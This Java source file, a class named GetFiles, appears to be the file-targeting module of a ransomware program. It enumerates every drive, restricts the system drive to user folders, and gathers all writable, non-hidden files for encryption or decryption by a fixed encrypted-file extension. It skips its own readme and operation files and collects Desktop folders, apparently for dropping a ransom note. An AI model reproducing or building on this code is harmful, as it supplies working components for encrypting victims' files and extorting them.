package files;

import enums.To;
import helpers.Constants;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;

public class GetFiles {
    private final File[] roots;
    private final ArrayList<File> desktops;
    private final String os;

    public GetFiles(String os) {
        roots = scanRoots();
        desktops = new ArrayList<>();
        this.os = os;
    }

    private File[] scanRoots() { // Get partitions
        return File.listRoots();
    }

    /**
     * Get the roots files
     * @return array from roots
     */
    public File[] getRoots() {
        return roots;
    }

    /**
     * Get all writable files from the file path such as root
     * @param root The root file
     * @param to Why do you want to scan files?, to decrypt or encrypt them
     * @param isVerify In case of decryption, do you want to get a sample just to verify the key,
     *                 or do you want to get all the encrypted files?
     * @return ِArrayList It contains all files that can be encrypted, decrypted, or sampled
     */
    public ArrayList<File> scanFiles(File root, To to, boolean isVerify) {
        ArrayList<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(root.listFiles())));
        int i = 0;
        boolean isEnd;
        boolean isSystemDrive = (root.toString().equals("C:\\"));
        if (isSystemDrive) {
            // delete files system
            for (int n = 0; n < files.size(); n++)
                if (!files.get(n).getName().equals("Users"))
                    files.remove(n--);
        }
        loo:
        do {
            File file = files.get(i);
            while (file.isDirectory()) {
                if (file.getName().equals("Desktop") && file.canWrite())
                    desktops.add(file);
                    
                if (file.canWrite() && !file.isHidden() && file.listFiles() != null) {
                    files.remove(i);
                    files.addAll(i, Arrays.asList(file.listFiles()));
                    file = files.get(i);
                } else {
                    files.remove(i);
                    if (i < files.size())
                        file = files.get(i);
                    else
                        break loo;
                }
            }
            if (isVerify && file.getName().endsWith(Constants.fileEncryptedExtension)) {
                ArrayList<File> f = new ArrayList<>();
                f.add(file);
                return f;
            }
            isEnd = files.size() <= ++i;
        } while (!isEnd);

        // Filtration
        for (int j = 0; j < files.size(); j++) {
            File file = files.get(j);
            if (to == To.DECRYPTION && !file.getName().endsWith(Constants.fileEncryptedExtension)
            || to == To.ENCRYPTION && (file.getName().endsWith(Constants.fileEncryptedExtension)
            || file.getName().contains(Constants.readmeFileName.substring(0, Constants.readmeFileName.indexOf('e'))))) {
                files.remove(j--);
                continue;
            }
            // Delete directories and can't write files and operation
            if (file.isDirectory() || !file.canWrite() || file.getName().equals(Constants.operationFileName))
                files.remove(j--);
        }
        return files;
    }

    /**
     * Get the desktops
     * @return array list from desktops
     */
    public ArrayList<File> getDesktops() {
        for (int i = 0; i < desktops.size() && desktops.size() > i + 1; i++)
            if (desktops.get(i).getPath().equalsIgnoreCase(desktops.get(i + 1).getPath()))
                desktops.remove(i);
        return desktops;
    }
}
